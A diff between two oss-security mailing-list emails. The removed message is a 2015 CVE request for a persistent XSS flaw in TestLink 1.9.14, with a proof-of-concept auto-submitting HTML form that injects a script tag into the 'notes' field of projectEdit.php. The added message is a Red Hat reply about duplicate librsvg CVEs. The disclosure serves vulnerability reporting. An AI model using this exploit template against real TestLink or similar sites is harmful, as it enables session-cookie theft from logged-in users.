@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2681" "Sunday" "8" "November" "2015" "20:25:46" "+0530" "Aravind" "altoarun@gmail.com" "<CALySL4QPLKPQzzLRRkr5U-nSEmE4DOUfsqSKQtdrkFGkikD48A@mail.gmail.com>" "98" "[oss-security] CVE Request: TestLink 1.9.14 Persistent XSS Vulnerability" nil nil nil "11" "2015110814:55:46" "[oss-security] CVE Request: TestLink 1.9.14 Persistent XSS Vulnerability" (number mark "U       altoarun@gma Nov  8   98/2681  " thread-indent "\"[oss-security] CVE Request: TestLink 1.9.14 Persistent XSS Vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1546" "Monday" "6" "June" "2016" "15:54:13" "+0200" "Adam Maris" "amaris@redhat.com" "<0d0061c0-7c51-98cd-e62b-073743e31d25@redhat.com>" "49" "Re: [oss-security] Re: CVE requests: DoS in librsvg parsing SVGs with circular definitions" "^Cc:" nil nil "6" "2016060613:54:13" "[oss-security] Re: CVE requests: DoS in librsvg parsing SVGs with circular definitions" (number mark "        amaris@redha Jun  6   49/1546  " thread-indent "\"Re: [oss-security] Re: CVE requests: DoS in librsvg parsing SVGs with circular definitions\"\n") "<CACn5sdSBwUpHD6KVqNnGfRj_7ofzmG0VHxz=xTBfe3vSVNmW0g@mail.gmail.com>" ("<20160428164611.B328A3AE1A8@smtpvbsrv1.mitre.org>" "<87d1otk0an.fsf@prune.linuxpenguins.xyz>" "<CACn5sdSBwUpHD6KVqNnGfRj_7ofzmG0VHxz=xTBfe3vSVNmW0g@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 11505 invoked by uid 550); 8 Nov 2015 15:25:46 -0000
+Received: (qmail 25889 invoked by uid 550); 6 Jun 2016 13:54:29 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,123 +11,73 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 26158 invoked from network); 8 Nov 2015 14:56:17 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20120113;
-        h=mime-version:from:date:message-id:subject:to:content-type;
-        bh=fdg7Ln7nT/16Z9QHxnYlprThaP4aFVJ5nygBOSharfM=;
-        b=bm9ALDCjqYDdIYEt7siG+DOGYa1azjM0TbYwNgVsSCrWZ5Ujl2aTSm96MdTCIrdbEJ
-         cR7fkOCbu55aHyOIYHYNcHYE49Ajryw3S/ltHUSVN8t71OvwiSpM+TDXqUnXQG//cuaQ
-         +L8609YBQW4vJdamSvEI98qqz5qnAuFxDe3S6+Sj+BN6/6eak1STVu3bQ8690kbvl+6s
-         dqSzUMHIKIGx6McsnorKiLe87lzw15kHuQQK+DLjvuGqn4e3DLsqySnZfwQBvCuVZpr4
-         TWGpKgIOejqh4FD2g48FcSJtCuNlJKWu006dtSgUkQKq5RUzgXM7o2MrP1w43nQneTQM
-         D14A==
-X-Received: by 10.194.179.35 with SMTP id dd3mr3092545wjc.125.1446994565443;
- Sun, 08 Nov 2015 06:56:05 -0800 (PST)
+Received: (qmail 25865 invoked from network); 6 Jun 2016 13:54:28 -0000
+References: <20160428164611.B328A3AE1A8@smtpvbsrv1.mitre.org>
+ <87d1otk0an.fsf@prune.linuxpenguins.xyz>
+ <CACn5sdSBwUpHD6KVqNnGfRj_7ofzmG0VHxz=xTBfe3vSVNmW0g@mail.gmail.com>
+Message-ID: <0d0061c0-7c51-98cd-e62b-073743e31d25@redhat.com>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+ Thunderbird/45.0
 MIME-Version: 1.0
-From: Aravind <altoarun@gmail.com>
-Date: Sun, 8 Nov 2015 20:25:46 +0530
-Message-ID: <CALySL4QPLKPQzzLRRkr5U-nSEmE4DOUfsqSKQtdrkFGkikD48A@mail.gmail.com>
+In-Reply-To: <CACn5sdSBwUpHD6KVqNnGfRj_7ofzmG0VHxz=xTBfe3vSVNmW0g@mail.gmail.com>
+Content-Type: multipart/alternative;
+ boundary="------------268B802B2B95401A4F8A2495"
+X-Scanned-By: MIMEDefang 2.68 on 10.5.11.23
+X-Greylist: Sender IP whitelisted, not delayed by milter-greylist-4.5.16 (mx1.redhat.com [10.5.110.28]); Mon, 06 Jun 2016 13:54:16 +0000 (UTC)
+Cc: cve-assign@mitre.org
+Date: Mon, 6 Jun 2016 15:54:13 +0200
+From: Adam Maris <amaris@redhat.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] Re: CVE requests: DoS in librsvg parsing SVGs with
+ circular definitions
 To: oss-security@lists.openwall.com
-Content-Type: text/plain; charset=UTF-8
-Subject: [oss-security] CVE Request: TestLink 1.9.14 Persistent XSS Vulnerability
 
-Can I have a CVE assigned to the following ?
-
-
-Information
-=================================
-Name: Persistent XSS Vulnerability in TestLink 1.9.14
-Affected Software: TestLink
-Affected Versions: 1.9.14 and possibly below
-Vendor Homepage: http://testlink.org/
-Severity: High
-Status: Fixed
+--------------268B802B2B95401A4F8A2495
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 8bit
 
 
-Vulnerability Type:
-=================================
-Persistent XSS
+
+On 15/05/16 09:05, Gustavo Grieco wrote:
+> 2016-05-11 0:36 GMT+02:00 Brian May <brian@linuxpenguins.xyz>:
+>> Just did a git bisect against the source. Assuming I got this right, the
+>> following commits fixed the issue.
+> Thanks for taking the time to do the git bisect!
+>
+>>>> They affect the following functions:
+>>>> * rsvg_cairo_pop_discrete_layer - rsvg_cairo_pop_render_stack -
+>>>> rsvg_cairo_generate_mask: reproducible using circular-1.svg
+>>> Use CVE-2016-4347.
+>> Fixed in:
+>>
+>> commit a51919f7e1ca9c535390a746fbf6e28c8402dc61
+>> Author: Benjamin Otte <otte@redhat.com>
+>> Date:   Wed Oct 7 08:45:37 2015 +0200
+>>
+>>     rsvg: Add rsvg_acquire_node()
+>>
+>>     This function does proper recursion checks when looking up resources
+>>     from URLs and thereby helps avoiding infinite loops when cyclic
+>>     references span multiple types of elements.
+>
+> I think CVE-2016-4347 and CVE-2015-7558 (stack exhaustion due to
+> cyclic dependency, reported here:
+> http://www.openwall.com/lists/oss-security/2015/12/21/5) are in fact,
+> the same issue. This is probably my fault (sorry!).
+>
+> MITRE: We should reject the the newly assigned one?
+>
+> Regards,
+> Gustavo.
+
+CC'ing MITRE in case they missed this question. We confirm it is a
+duplication. Which CVE should be rejected?
+
+Thanks!
+
+-- 
+Adam Mariš, Red Hat Product Security
+1CCD 3446 0529 81E3 86AF  2D4C 4869 76E7 BEF0 6BC2
 
 
-CVE Reference:
-=================================
-Not assigned
-
-
-Technical Details:
-=================================
-Persistent XSS entry point exist in TestLink 1.9.14 allowing arbitrary
-client side browser
-code execution on victims who visit persistently stored XSS payloads.
-The vulnerability has been
-discovered in the POST request to create a new Test Project. By
-exploiting the vulnerability,
-the attacker will get access to the logged in users session cookie. No
-Filtering exist on the
-vulnerable parameter.
-
-
-Vulnerable Parameter:
-=================================
-notes
-
-
-Exploit Code
-=================================
-
-<html lang="en">
-<head>
-<title>Exploit Persistent XSS TestLink 1.9.14</title>
-</head>
-<body>
-<form action="http://localhost/testlink_1_9_14/lib/project/projectEdit.php"
-id="formid" method="post">
-<input type="hidden" name="CSRFName" value="" />
-<input type="hidden" name="CSRFToken" value="" />
-<input type="hidden" name="copy_from_tproject_id" value="0" />
-<input type="hidden" name="tprojectName" value="c1" />
-<input type="hidden" name="tcasePrefix" value="c2" />
-<input type="hidden" name="notes" value="<script>alert(222)</script>" />
-<input type="hidden" name="optPriority" value="on" />
-<input type="hidden" name="optAutomation" value="on" />
-<input type="hidden" name="active" value="on" />
-<input type="hidden" name="is_public" value="on" />
-<input type="hidden" name="doAction" value="doCreate" />
-<input type="hidden" name="tprojectID" value="0" />
-<input type="hidden" name="doActionButton" value="Create" />
-</form>
-<script>
-document.getElementById('formid').submit();
-</script>
-</body>
-</html>
-
-
-Exploitation Technique:
-===================================
-Remote
-
-
-Severity Level:
-===================================
-High
-
-
-Advisory Timeline
-===================================
-Sat, 7 Nov 2015 13:14:33 +0530 - First Contact
-Sat, 7 Nov 2015 08:52:14 +0100 - Vendor Response
-Sat, 7 Nov 2015 13:00:54 +0100 - Vendor Fixed
-Sun, 8 Nov 2015 19:03:00 +0530 - Public Disclosure
-
-
-Solution
-====================================
-This vulnerability is fixed in TestLink 1.9.15 (Tauriel)
-Fix: https://github.com/TestLinkOpenSourceTRMS/testlink-code/commit/1cb1f78f1a50f6e6819bcbadeae345eb3213c487
-
-Credits & Authors
-====================================
-Aravind C Ajayan, Boney S Kalarickal
+--------------268B802B2B95401A4F8A2495--
